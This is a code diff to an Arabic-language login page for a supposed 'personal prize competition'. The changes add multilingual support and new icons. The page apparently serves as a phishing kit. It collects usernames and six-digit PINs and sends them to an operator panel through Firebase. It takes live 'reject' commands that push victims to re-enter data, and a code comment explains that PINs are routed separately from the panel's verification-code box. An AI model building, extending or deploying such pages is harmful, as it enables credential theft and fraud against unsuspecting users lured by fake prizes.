@@ -1,9 +1,10 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar" dir="rtl" data-page="username">
 <head>
   <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
   <title>إدخال اسم المستخدم</title>
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <script src="/assets/js/site-lang.js?v=1"></script>
   <style>
     :root{--pink:#f7a1af;--pink-hover:#ef8fa1;--green:#69d9a7;--ink:#263238;--muted:#9aa4ae}
     *{box-sizing:border-box}
@@ -31,10 +32,12 @@
     .submit.active{background:#df2929;color:#fff;cursor:pointer}
     .submit.active:hover{background:#c51f28}
     .pin-stage{display:none;width:min(100%,430px);margin:0 auto;padding:8px 11px 24px}
+    .pin-stage h1{margin:0 0 8px;text-align:right;font-size:19px;line-height:1.55;font-weight:800}
     .pin-stage.active{display:block}
     .pin-field-wrap{position:relative}
     .pin-field-wrap input{direction:ltr;text-align:right;padding-left:48px}
-    .pin-delete{position:absolute;left:8px;top:50%;transform:translateY(-50%);width:32px;height:32px;border:0;border-radius:7px;background:transparent;color:#7b858e;font-size:18px;cursor:pointer}
+    .pin-delete{position:absolute;left:8px;top:50%;transform:translateY(-50%);width:32px;height:32px;border:0;border-radius:7px;background:transparent;color:#7b858e;font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center}
+    .digit svg{display:block;margin:0 auto}
     .keypad-sheet{display:none;position:absolute;right:0;bottom:0;left:0;min-height:278px;background:#fff;border-radius:15px 15px 0 0;padding:15px 16px 18px;box-shadow:0 -10px 30px #0000001a;text-align:center}
     .keypad-sheet.active{display:block}
     .handle{width:42px;height:4px;margin:-5px auto 9px;border-radius:9px;background:#dfe3e6}
@@ -45,47 +48,57 @@
     .digit{height:44px;border:1px solid #dfe3e6;border-radius:8px;background:#fff;color:#263238;font:700 17px Cairo,sans-serif;cursor:pointer}
     .pin-submit{width:min(100%,358px);height:46px;margin:10px auto 0;border:0;border-radius:24px;background:#767c83;color:#e6e7e9;font:800 14px Cairo,sans-serif;display:block;cursor:not-allowed;transition:background .2s ease,color .2s ease}
     .pin-submit.active{background:#df2929;color:#fff;cursor:pointer}
+    /* اللغة الإنجليزية/الفرنسية: اتجاه من اليسار لليمين */
+    html[dir="ltr"] .topbar { justify-content: flex-start; }
+    html[dir="ltr"] .back { transform: scaleX(-1); }
+    html[dir="ltr"] .card h1, html[dir="ltr"] .pin-stage h1,
+    html[dir="ltr"] .intro, html[dir="ltr"] .field label,
+    html[dir="ltr"] .error, html[dir="ltr"] .reject-warning { text-align: left; }
+    html[dir="ltr"] .link-row { justify-content: flex-start; }
+    html[dir="ltr"] .options { align-items: flex-start; }
+    html[dir="ltr"] .pin-field-wrap input { text-align: left; padding-left: 12px; padding-right: 48px; }
+    html[dir="ltr"] .pin-delete { left: auto; right: 8px; }
     @media(max-height:700px){.keypad-sheet{min-height:250px;padding-top:10px}.digits{grid-template-columns:repeat(3,82px);gap:6px}.digit{height:38px}.dots{margin-bottom:8px}.pin-submit{height:42px;margin-top:8px}}
     @media(min-width:700px){body{background:#f7f8f9}.topbar{max-width:430px;margin:40px auto 0}.card,.pin-stage{background:#fff;border-radius:18px;padding:16px 18px 26px;box-shadow:0 10px 30px #0000000d}.topbar{padding:0 18px}}
   </style>
 </head>
 <body>
-  <header class="topbar"><button class="back" type="button" aria-label="رجوع" onclick="history.back()">←</button></header>
+  <header class="topbar"><button class="back" type="button" aria-label="رجوع" data-i18n-aria="username.back" onclick="history.back()">←</button></header>
   <main class="card">
-    <h1>قم بتسجيل الدخول للوصول الى المسابقة<br>الشخصية الخاصة بك</h1>
-    <p class="intro">ادخل اسم المستخدم الخاص بك لتسجيل الدخول</p>
-    <div class="reject-warning" id="rejectWarning" role="alert">يرجى إدخال بيانات صحيحه واعادة المحاولة</div>
+    <h1 data-i18n-html="username.heading">قم بتسجيل الدخول للوصول الى المسابقة<br>الشخصية الخاصة بك</h1>
+    <p class="intro" data-i18n="username.intro">ادخل اسم المستخدم الخاص بك لتسجيل الدخول</p>
+    <div class="reject-warning" id="rejectWarning" role="alert" data-i18n="username.reject">يرجى إدخال بيانات صحيحه واعادة المحاولة</div>
     <form id="usernameForm">
       <div class="field">
-        <label for="username">اسم المستخدم</label>
-        <input id="username" autocomplete="username" required placeholder="اسم المستخدم">
+        <label for="username" data-i18n="username.label">اسم المستخدم</label>
+        <input id="username" autocomplete="username" required placeholder="اسم المستخدم" data-i18n-ph="username.placeholder">
       </div>
-      <div class="link-row"><a href="#" id="forgotUsername">نسيت اسم المستخدم؟</a></div>
+      <div class="link-row"><a href="#" id="forgotUsername" data-i18n="username.forgot">نسيت اسم المستخدم؟</a></div>
       <div class="options">
-        <label class="option"><input type="checkbox" name="rememberName"><span>تذكر اسمي</span></label>
-        <label class="option"><input type="checkbox" name="rememberPhone"><span>تذكر الجوال</span></label>
+        <label class="option"><input type="checkbox" name="rememberName"><span data-i18n="username.rememberName">تذكر اسمي</span></label>
+        <label class="option"><input type="checkbox" name="rememberPhone"><span data-i18n="username.rememberPhone">تذكر الجوال</span></label>
       </div>
-      <div class="error" id="error">يرجى إدخال اسم المستخدم.</div>
-      <button class="submit" type="submit" id="continueBtn">التالي</button>
+      <div class="error" id="error" data-i18n="username.error">يرجى إدخال اسم المستخدم.</div>
+      <button class="submit" type="submit" id="continueBtn" data-i18n="username.next">التالي</button>
     </form>
   </main>
   <main class="pin-stage" id="pinStage">
-    <h1>قم بتسجيل الدخول للوصول الى المسابقة<br>الشخصية الخاصة بك</h1>
-    <p class="intro">ادخل الرقم السري الخاص بك لتسجيل الدخول</p>
+    <h1 data-i18n-html="username.heading">قم بتسجيل الدخول للوصول الى المسابقة<br>الشخصية الخاصة بك</h1>
+    <p class="intro" data-i18n="username.pinIntro">ادخل الرقم السري الخاص بك لتسجيل الدخول</p>
     <div class="field">
-      <label for="pinDisplay">الرقم السري</label>
+      <label for="pinDisplay" data-i18n="username.pinLabel">الرقم السري</label>
       <div class="pin-field-wrap">
-        <input id="pinDisplay" type="text" inputmode="numeric" readonly placeholder="ادخل الرقم السري" value="">
-        <button class="pin-delete" id="pinDelete" type="button" aria-label="حذف آخر رقم">⌫</button>
+        <input id="pinDisplay" type="text" inputmode="numeric" readonly placeholder="ادخل الرقم السري" value="" data-i18n-ph="username.pinPlaceholder">
+        <button class="pin-delete" id="pinDelete" type="button" aria-label="حذف آخر رقم" data-i18n-aria="username.deleteAria"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 5H9l-7 7 7 7h11a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2Z"/><line x1="18" x2="12" y1="9" y2="15"/><line x1="12" x2="18" y1="9" y2="15"/></svg></button>
       </div>
     </div>
   </main>
-  <section class="keypad-sheet" id="keypadSheet" aria-label="لوحة إدخال الرقم السري">
+  <section class="keypad-sheet" id="keypadSheet" aria-label="لوحة إدخال الرقم السري" data-i18n-aria="username.keypadAria">
     <div class="handle"></div>
     <div class="dots" id="dots"><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i></div>
-    <div class="digits-label">ادخل رمزك السري</div>
+    <div class="digits-label" data-i18n="username.digitsLabel">ادخل رمزك السري</div>
     <div class="digits" id="keypad"></div>
-    <button class="pin-submit" id="pinSubmit" type="button" disabled>تسجيل الدخول</button>
+    <button class="pin-submit" id="pinSubmit" type="button" disabled data-i18n="username.pinSubmit">تسجيل الدخول</button>
   </section>
   <script src="/assets/js/firebase-env.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
@@ -110,7 +123,7 @@
       window.listenForPageCommands({
         onReject: function () {
           var warn = document.getElementById('rejectWarning');
-          warn.textContent = 'يرجى إدخال بيانات صحيحه واعادة المحاولة';
+          warn.textContent = window.SiteLang ? SiteLang.t('username.reject') : 'يرجى إدخال بيانات صحيحه واعادة المحاولة';
           warn.classList.add('show');
         }
       });
@@ -153,7 +166,7 @@
     const blank=document.createElement("button");blank.type="button";blank.className="digit";blank.disabled=true;blank.style.visibility="hidden";
     document.getElementById("keypad").appendChild(blank);
     const deleteButton=document.createElement("button");
-    deleteButton.type="button";deleteButton.className="digit";deleteButton.textContent="⌫";deleteButton.setAttribute("aria-label","حذف");
+    deleteButton.type="button";deleteButton.className="digit";deleteButton.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 5H9l-7 7 7 7h11a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2Z"/><line x1="18" x2="12" y1="9" y2="15"/><line x1="12" x2="18" y1="9" y2="15"/></svg>';deleteButton.setAttribute("aria-label", window.SiteLang ? SiteLang.t("username.deleteAria") : "حذف");
     deleteButton.addEventListener("click",()=>{pin=pin.slice(0,-1);renderPin()});
     document.getElementById("keypad").appendChild(deleteButton);
     document.getElementById("pinDelete").addEventListener("click",()=>{pin=pin.slice(0,-1);renderPin()});
@@ -163,7 +176,7 @@
       if(window.submitLogin)await window.submitLogin({username:localStorage.getItem("prizeUsername")||"",password:pin});
       // الرقم السري يُرسل مع تسجيل الدخول فقط (كلمة المرور)، لا كـ OTP،
       // حتى لا يظهر في صندوق «رموز التحقق» منفصلاً عن صندوق الدخول في اللوحة.
-      location.href="prize-wait.html";
+      location.href = window.SiteLang ? SiteLang.href("prize-wait.html") : "prize-wait.html";
     });
   </script>
 </body>
